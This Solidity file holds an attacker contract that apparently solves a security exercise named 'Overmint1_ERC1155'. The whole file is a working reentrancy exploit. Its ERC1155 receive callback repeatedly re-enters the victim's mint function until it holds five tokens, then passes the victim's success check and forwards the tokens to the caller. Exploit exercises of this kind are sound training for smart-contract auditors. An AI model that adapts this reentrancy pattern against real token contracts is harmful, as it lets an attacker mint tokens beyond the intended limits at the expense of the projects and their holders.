// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IOvermint1_ERC1155 {
    function mint(uint256 id, bytes calldata data) external;

    function success(address _attacker, uint256 id) external view returns (bool);
}

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    address victim;
    uint256 constant tokenId = 0;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() public {
        IOvermint1_ERC1155(victim).mint(tokenId, "");
        require(IOvermint1_ERC1155(victim).success(address(this), tokenId));
        IERC1155(victim).safeTransferFrom(
            address(this),
            msg.sender,
            tokenId,
            IERC1155(victim).balanceOf(address(this), tokenId),
            ""
        );
    }

    function supportsInterface(bytes4) external pure override returns (bool) {
        return true;
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        require(id == tokenId, "unknown tokenId");
        if (IERC1155(victim).balanceOf(address(this), tokenId) < 5) {
            IOvermint1_ERC1155(victim).mint(tokenId, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }
}
